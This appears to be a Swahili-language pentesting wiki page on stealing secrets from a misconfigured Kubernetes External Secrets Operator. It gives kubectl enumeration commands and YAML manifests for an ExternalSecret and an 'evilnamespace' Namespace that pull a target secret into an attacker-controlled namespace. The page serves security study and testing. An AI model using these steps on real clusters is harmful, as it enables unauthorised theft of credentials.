# External Secret Operator

**Mwandishi wa awali wa ukurasa huu ni** [**Fares**](https://www.linkedin.com/in/fares-siala/)

Ukurasa huu unatoa vidokezo juu ya jinsi unavyoweza kufanikisha wizi wa siri kutoka kwa ESO isiyo na usanidi mzuri au programu inayotumia ESO kusawazisha siri zake.

## Disclaimer

Mbinu iliyoonyeshwa hapa chini inaweza kufanya kazi tu wakati hali fulani zinakutana. Kwa mfano, inategemea mahitaji yanayohitajika kuruhusu siri kusawazishwa kwenye namespace ambayo unamiliki / umevamia. Unahitaji kujifunza mwenyewe.

## Prerequisites

1. Kuwepo katika klasta ya kubernetes / openshift yenye haki za admin kwenye namespace
2. Ufikiaji wa kusoma angalau ExternalSecret katika ngazi ya klasta
3. Jifunze kama kuna lebo / maelezo yoyote au uanachama wa kikundi unaohitajika ambayo inaruhusu ESO kusawazisha siri yako. Ikiwa una bahati, unaweza kuiba siri yoyote iliyofafanuliwa kwa urahisi.

### Gathering information about existing ClusterSecretStore

Kukisia kwamba una watumiaji ambao wana haki za kutosha kusoma rasilimali hii; anza kwa kwanza kuorodhesha _**ClusterSecretStores**_ zilizopo.
```sh
kubectl get ClusterSecretStore
```
### ExternalSecret enumeration

Tuchukulie kuwa umepata ClusterSecretStore inayoitwa _**mystore**_. Endelea kwa kuorodhesha externalsecret zake zinazohusiana.
```sh
kubectl get externalsecret -A | grep mystore
```
_Resursi hii ina kiwango cha namespace hivyo isipokuwa unajua tayari ni namespace ipi ya kutafuta, ongeza chaguo -A kutafuta katika namespaces zote._

Unapaswa kupata orodha ya externalsecret zilizofafanuliwa. Tuone umefind externalsecret object inayoitwa _**mysecret**_ iliyofafanuliwa na kutumika na namespace _**mynamespace**_. Kusanya taarifa zaidi kuhusu ni aina gani ya siri inayoishikilia.
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### Kuunganisha vipande

Kutoka hapa unaweza kupata jina la moja au majina kadhaa ya siri (kama ilivyoainishwa katika rasilimali ya Siri). Utapata matokeo yanayofanana na:
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
Hadi sasa tumepata:

- Jina la ClusterSecretStore
- Jina la ExternalSecret
- Jina la siri

Sasa kwamba tuna kila kitu tunachohitaji, unaweza kuunda ExternalSecret (na hatimaye kuboresha/kuunda Namespace mpya ili kuzingatia mahitaji yanayohitajika ili kupata siri yako mpya iunganishwe):
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
Baada ya dakika chache, ikiwa masharti ya usawazishaji yamekamilika, unapaswa kuwa na uwezo wa kuona siri iliyovuja ndani ya nafasi yako.
```sh
kubectl get secret leaked_secret -o yaml
```
## Marejeo

{{#ref}}
https://external-secrets.io/latest/
{{#endref}}

{{#ref}}
https://github.com/external-secrets/external-secrets
{{#endref}}
